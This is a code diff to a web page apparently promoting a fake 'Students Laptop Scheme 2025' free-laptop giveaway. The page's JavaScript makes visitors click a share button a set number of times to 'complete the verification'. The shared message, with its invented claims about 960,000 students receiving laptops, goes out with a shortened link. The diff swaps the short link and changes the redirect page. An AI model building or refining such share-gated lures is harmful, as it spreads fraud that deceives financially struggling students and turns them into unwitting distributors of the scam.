@@ -118,7 +118,7 @@
 <body>
 
     <div class="container">
-        <img src="laptop-offer.jpg" alt="Free Laptops for 2025 Students Edition" class="header-image">
+        <img src="Laptop-offer.jpg" alt="Free Laptops for 2025 Students Edition" class="header-image">
         <div class="header">
             STUDENTS LAPTOPS SUPPORT 2025
         </div>
@@ -173,19 +173,9 @@
                     shareCount++;
                     const progressPercentage = (shareCount / requiredShares) * 100;
                     progressBar.style.width = progressPercentage + '%';
-                    
-                    const shareText = " a The Applications for the Students Laptop Scheme 2025 Is Available*
-
-This scheme is open to all students who for financial reasons are not in a position to purchase a laptop of their own and are in need of laptop in their level of education.
-
-*In 2025 Over 960,000 students will be given free laptop to enhance their learning*
-
-*Application has began and students that have applied have started getting their laptops*
-
-Register and apply here
-
-: ";
-                    const shareLink = "https://LUyrCz.short.gy/Free-laptop-shemes"; 
+                  
+                    const shareText = "The Applications for the Students Laptop Scheme 2025 Is Available*\n\nThis scheme is open to all students who for financial reasons are not in a position to purchase a laptop of their own and are in need of laptop in their level of education.\n\n*In 2025 Over 960,000 students will be given free laptop to enhance their learning*\n\n*Application has began and students that have applied have started getting their laptops*\n\nRegister and apply here\n:";
+                    const shareLink = "https://bit.ly/Free-laptop-scheme"; 
                     const fullMessage = shareText + shareLink;
                     const message = encodeURIComponent(fullMessage);
                     
@@ -199,7 +189,7 @@ Register and apply here
             validateButton.addEventListener('click', () => {
                 if (shareCount >= requiredShares) {
                     // If sharing is complete, redirect to the "forth-page.html".
-                    window.location.href = 'forth-page.html'; // <<< KEY CHANGE HERE
+                    window.location.href = 'confirmation.html'; // <<< KEY CHANGE HERE
                 } else {
                     const remaining = requiredShares - shareCount;
                     alert(`Please click the SHARE button ${remaining} more time(s) to complete the verification.`);
